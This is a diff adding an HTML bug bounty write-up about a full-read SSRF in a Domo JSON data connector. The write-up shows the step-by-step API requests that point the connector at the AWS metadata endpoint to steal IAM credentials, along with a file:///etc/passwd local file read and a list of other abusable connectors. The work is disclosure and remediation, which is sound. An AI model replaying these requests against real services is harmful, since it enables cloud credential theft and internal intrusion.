@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Full-Read SSRF via JSON Connector to AWS Credential Theft — oxship</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --primary: #00FF41;
+            --on-primary: #0F172A;
+            --bg: #000000;
+            --bg-elevated: #0C130E;
+            --fg: #E0E0E0;
+            --muted: #94A3B8;
+            --muted-bg: #181818;
+            --border: #1F1F1F;
+            --accent-red: #FF3333;
+            --accent-orange: #FFA500;
+            --ring: #00FF41;
+
+            --font-mono: 'JetBrains Mono', monospace;
+            --text-sm: 12px;
+            --text-base: 14px;
+            --text-lg: 16px;
+            --text-xl: 24px;
+            --text-2xl: 32px;
+            --lh: 1.6;
+
+            --space-xs: 4px;
+            --space-sm: 8px;
+            --space-md: 16px;
+            --space-lg: 24px;
+            --space-xl: 48px;
+            --space-2xl: 80px;
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            *, *::before, *::after { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; }
+        }
+
+        body {
+            font-family: var(--font-mono);
+            font-size: var(--text-base);
+            line-height: var(--lh);
+            background: var(--bg);
+            color: var(--fg);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,65,0.015) 2px, rgba(0,255,65,0.015) 4px);
+            pointer-events: none;
+            z-index: 9999;
+        }
+
+        .container {
+            max-width: 740px;
+            margin: 0 auto;
+            padding: var(--space-2xl) var(--space-lg);
+        }
+
+        a { color: var(--primary); text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        a:focus-visible { outline: 2px solid var(--ring); outline-offset: 2px; }
+
+        /* ---- Back nav ---- */
+        .back {
+            font-size: var(--text-sm);
+            color: var(--muted);
+            margin-bottom: var(--space-xl);
+            display: inline-block;
+        }
+        .back::before { content: '< '; color: var(--primary); }
+        .back:hover { color: var(--primary); text-decoration: none; }
+
+        /* ---- Header ---- */
+        .writeup-header {
+            margin-bottom: var(--space-xl);
+            padding-bottom: var(--space-lg);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .writeup-header h1 {
+            font-size: var(--text-xl);
+            font-weight: 700;
+            color: var(--fg);
+            letter-spacing: -0.5px;
+            margin-bottom: var(--space-md);
+        }
+
+        .meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: var(--space-md);
+            font-size: var(--text-sm);
+            color: var(--muted);
+        }
+
+        .tag {
+            font-size: 10px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            padding: 2px 8px;
+        }
+
+        .tag.critical {
+            background: rgba(255, 51, 51, 0.15);
+            color: var(--accent-red);
+            border: 1px solid rgba(255, 51, 51, 0.3);
+        }
+
+        .tag.platform {
+            background: rgba(0, 255, 65, 0.04);
+            color: var(--primary);
+            border: 1px solid rgba(0, 255, 65, 0.15);
+        }
+
+        /* ---- Content ---- */
+        h2 {
+            font-size: var(--text-sm);
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
+            color: var(--primary);
+            margin-top: var(--space-xl);
+            margin-bottom: var(--space-md);
+            display: flex;
+            align-items: center;
+            gap: var(--space-sm);
+        }
+
+        h2::before { content: '#'; opacity: 0.4; }
+        h2::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+
+        h3 {
+            font-size: var(--text-base);
+            font-weight: 700;
+            color: var(--fg);
+            margin-top: var(--space-lg);
+            margin-bottom: var(--space-sm);
+        }
+
+        p {
+            color: var(--muted);
+            font-size: var(--text-base);
+            margin-bottom: var(--space-md);
+        }
+
+        strong { color: var(--fg); font-weight: 500; }
+
+        ul, ol {
+            color: var(--muted);
+            font-size: var(--text-base);
+            margin-bottom: var(--space-md);
+            padding-left: var(--space-lg);
+        }
+
+        li { margin-bottom: var(--space-xs); }
+        li strong { color: var(--fg); }
+
+        /* ---- Code blocks ---- */
+        pre {
+            background: var(--bg-elevated);
+            border: 1px solid var(--border);
+            padding: var(--space-md);
+            margin-bottom: var(--space-md);
+            overflow-x: auto;
+            font-size: var(--text-sm);
+            line-height: 1.5;
+            color: var(--fg);
+        }
+
+        code {
+            font-family: var(--font-mono);
+            font-size: var(--text-sm);
+        }
+
+        p code {
+            background: var(--bg-elevated);
+            padding: 1px 6px;
+            border: 1px solid var(--border);
+            color: var(--primary);
+        }
+
+        /* ---- Callouts ---- */
+        .callout {
+            border-left: 2px solid var(--accent-red);
+            padding: var(--space-md);
+            margin-bottom: var(--space-md);
+            background: rgba(255, 51, 51, 0.04);
+        }
+
+        .callout.impact {
+            border-left-color: var(--accent-red);
+            background: rgba(255, 51, 51, 0.04);
+        }
+
+        .callout p { margin-bottom: 0; }
+        .callout p + p { margin-top: var(--space-sm); }
+
+        /* ---- Chain diagram ---- */
+        .chain {
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+            margin-bottom: var(--space-lg);
+        }
+
+        .chain-step {
+            display: flex;
+            align-items: flex-start;
+            gap: var(--space-md);
+            padding: var(--space-md);
+            border: 1px solid var(--border);
+            border-bottom: none;
+        }
+
+        .chain-step:last-child { border-bottom: 1px solid var(--border); }
+
+        .chain-step .num {
+            color: var(--primary);
+            font-weight: 700;
+            font-size: var(--text-sm);
+            flex-shrink: 0;
+            min-width: 20px;
+        }
+
+        .chain-step .step-content {
+            flex: 1;
+        }
+
+        .chain-step .step-title {
+            color: var(--fg);
+            font-weight: 500;
+            font-size: var(--text-base);
+        }
+
+        .chain-step .step-desc {
+            color: var(--muted);
+            font-size: var(--text-sm);
+            margin-top: 2px;
+        }
+
+        .arrow {
+            text-align: center;
+            color: var(--primary);
+            opacity: 0.4;
+            font-size: var(--text-sm);
+            padding: 2px 0;
+        }
+
+        /* ---- Data table ---- */
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: var(--space-md);
+            font-size: var(--text-sm);
+        }
+
+        .data-table th {
+            text-align: left;
+            color: var(--primary);
+            font-weight: 500;
+            padding: var(--space-sm) var(--space-md);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .data-table td {
+            color: var(--muted);
+            padding: var(--space-sm) var(--space-md);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .data-table td:first-child { color: var(--fg); }
+
+        .redacted {
+            background: var(--accent-red);
+            color: var(--accent-red);
+            padding: 0 4px;
+            user-select: none;
+            font-size: var(--text-sm);
+        }
+
+        /* ---- Footer ---- */
+        footer {
+            margin-top: var(--space-2xl);
+            padding-top: var(--space-md);
+            border-top: 1px solid var(--border);
+            text-align: center;
+            font-size: var(--text-sm);
+            color: var(--muted);
+        }
+        footer span { color: var(--primary); opacity: 0.5; }
+
+        @media (max-width: 600px) {
+            .container { padding: var(--space-xl) var(--space-md); }
+            .writeup-header h1 { font-size: var(--text-lg); }
+            .meta { flex-direction: column; gap: var(--space-sm); }
+            .chain-step { flex-direction: column; gap: var(--space-sm); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="../" class="back">oxship</a>
+
+        <header class="writeup-header">
+            <h1>Full-Read SSRF via JSON Connector to AWS Credential Theft</h1>
+            <div class="meta">
+                <span class="tag critical">Critical</span>
+                <span class="tag platform">Intigriti</span>
+                <span>March 2026</span>
+                <span>SSRF / Cloud</span>
+            </div>
+        </header>
+
+        <h2>TL;DR</h2>
+        <p>Upgraded a blind SSRF to a <strong>full-read SSRF</strong> by abusing a JSON data connector. The connector fetches arbitrary URLs and stores parsed responses as queryable dataset rows — making any JSON endpoint fully readable. Exploited to steal <strong>AWS IAM temporary credentials</strong> from the EC2 metadata service (IMDSv1).</p>
+
+        <h2>Attack Chain</h2>
+        <div class="chain">
+            <div class="chain-step">
+                <span class="num">01</span>
+                <div class="step-content">
+                    <div class="step-title">Create a JSON connector stream</div>
+                    <div class="step-desc">Register a new data stream using the JSON No Auth connector (<code>com.domo.connector.json</code>)</div>
+                </div>
+            </div>
+            <div class="chain-step">
+                <span class="num">02</span>
+                <div class="step-content">
+                    <div class="step-title">Point it at internal infrastructure</div>
+                    <div class="step-desc">Configure the stream's <code>jsonPath</code> to fetch from AWS IMDS at <code>169.254.169.254</code></div>
+                </div>
+            </div>
+            <div class="chain-step">
+                <span class="num">03</span>
+                <div class="step-content">
+                    <div class="step-title">Execute the stream</div>
+                    <div class="step-desc">Trigger execution — the server-side connector fetches the URL and stores the response</div>
+                </div>
+            </div>
+            <div class="chain-step">
+                <span class="num">04</span>
+                <div class="step-content">
+                    <div class="step-title">Query the stolen data</div>
+                    <div class="step-desc">Run SQL against the dataset to read the full response — AWS credentials included</div>
+                </div>
+            </div>
+        </div>
+
+        <h2>Exploitation</h2>
+
+        <h3>Step 1 — Create the stream</h3>
+        <pre><code>POST /api/data/v1/streams
+
+{
+  "transport": {
+    "type": "CONNECTOR",
+    "description": "com.domo.connector.json",
+    "version": "4"
+  },
+  "updateMethod": "REPLACE",
+  "dataProvider": { "key": "json" },
+  "dataSource": {
+    "displayType": "json",
+    "dataProviderType": "json",
+    "type": "json",
+    "name": "json_ssrf_test",
+    "description": "test"
+  }
+}</code></pre>
+        <p>Response: Stream ID <code>1512</code> created, linked to Dataset <code class="redacted">fa52763d-xxxx-xxxx-xxxx-xxxxxxxxxxxx</code></p>
+
+        <h3>Step 2 — Configure for AWS IMDS</h3>
+        <pre><code>PUT /api/data/v1/streams/1512
+
+{
+  "id": 1512,
+  "configuration": [
+    {
+      "streamId": 1512,
+      "category": "METADATA",
+      "name": "fileLocationType",
+      "value": "SFTP-FTP-HTTP-LOCAL-File"
+    },
+    {
+      "streamId": 1512,
+      "category": "METADATA",
+      "name": "jsonPath",
+      "value": "http://169.254.169.254/latest/meta-data/iam/security-credentials/<span class="redacted">REDACTED</span>"
+    },
+    {
+      "streamId": 1512,
+      "category": "METADATA",
+      "name": "fileFormat",
+      "value": "JSON"
+    }
+  ]
+}</code></pre>
+
+        <h3>Step 3 — Execute</h3>
+        <pre><code>POST /api/data/v1/streams/1512/executions</code></pre>
+
+        <h3>Step 4 — Query the exfiltrated data</h3>
+        <pre><code>POST /api/query/v1/execute/<span class="redacted">DATASET-ID</span>
+
+{ "sql": "SELECT * FROM self LIMIT 10" }</code></pre>
+
+        <h2>Data Exfiltrated</h2>
+
+        <h3>EC2 Instance Identity</h3>
+        <table class="data-table">
+            <tr><th>Field</th><th>Value</th></tr>
+            <tr><td>Instance Type</td><td>c6g.2xlarge (ARM64)</td></tr>
+            <tr><td>Region</td><td>us-east-1</td></tr>
+            <tr><td>Availability Zone</td><td>us-east-1f</td></tr>
+            <tr><td>Private IP</td><td><span class="redacted">REDACTED</span></td></tr>
+            <tr><td>Instance ID</td><td><span class="redacted">REDACTED</span></td></tr>
+            <tr><td>Account ID</td><td><span class="redacted">REDACTED</span></td></tr>
+        </table>
+
+        <h3>IAM Temporary Credentials</h3>
+        <table class="data-table">
+            <tr><th>Field</th><th>Value</th></tr>
+            <tr><td>AccessKeyId</td><td><span class="redacted">REDACTED</span></td></tr>
+            <tr><td>SecretAccessKey</td><td><span class="redacted">REDACTED</span></td></tr>
+            <tr><td>SessionToken</td><td><span class="redacted">REDACTED</span></td></tr>
+            <tr><td>Role</td><td><span class="redacted">REDACTED</span></td></tr>
+            <tr><td>Expiration</td><td>2026-03-15T22:28:23Z</td></tr>
+        </table>
+
+        <div class="callout impact">
+            <p><strong>Valid AWS credentials were obtained.</strong> These provide temporary access to whatever permissions the instance's IAM role grants — potentially S3 buckets, DynamoDB tables, Lambda functions, and other AWS services in the production account.</p>
+        </div>
+
+        <h2>Additional Findings</h2>
+
+        <h3>file:// Protocol Support</h3>
+        <p>The JSON connector also accepts <code>file://</code> URIs. Testing <code>file:///etc/passwd</code> returned:</p>
+        <pre><code>ERROR: A JSONObject text must begin with '{' at 1 [character 2 line 1]</code></pre>
+        <p>The file was read but rejected because <code>/etc/passwd</code> is not valid JSON. Any local JSON configuration file can be fully exfiltrated through this method.</p>
+
+        <h3>Other Exploitable Connectors</h3>
+        <p>Multiple connector types accept arbitrary URLs and could be weaponized the same way:</p>
+        <ul>
+            <li><code>com.domo.connector.csv.advanced</code> — CSV from HTTP/SFTP/FTP</li>
+            <li><code>com.domo.connector.xml</code> — XML from URLs</li>
+            <li><code>com.domo.connector.html-table</code> — HTML tables from URLs</li>
+            <li><code>com.domo.connector.json.advanced</code> — Advanced JSON with custom parsing</li>
+        </ul>
+
+        <h2>Impact</h2>
+        <ul>
+            <li><strong>Full-read SSRF</strong> — any admin user can read responses from arbitrary internal HTTP endpoints</li>
+            <li><strong>AWS credential theft</strong> — IMDSv1 accessible, yielding temporary IAM credentials for the production role</li>
+            <li><strong>Local file read</strong> — <code>file://</code> protocol reads local JSON files from the connector's execution environment</li>
+            <li><strong>Internal network reconnaissance</strong> — probe internal services by targeting HTTP endpoints across the VPC</li>
+        </ul>
+
+        <h2>Remediation</h2>
+        <ul>
+            <li>Block requests to link-local (169.254.x.x), private RFC1918, and loopback addresses from all connectors</li>
+            <li>Migrate all EC2 instances to IMDSv2 (token-based access)</li>
+            <li>Disable <code>file://</code> protocol support in connectors</li>
+            <li>Implement URL allowlisting for connector data sources</li>
+        </ul>
+
+        <footer><span>&gt;</span> oxship @ 2026</footer>
+    </div>
+</body>
+</html>
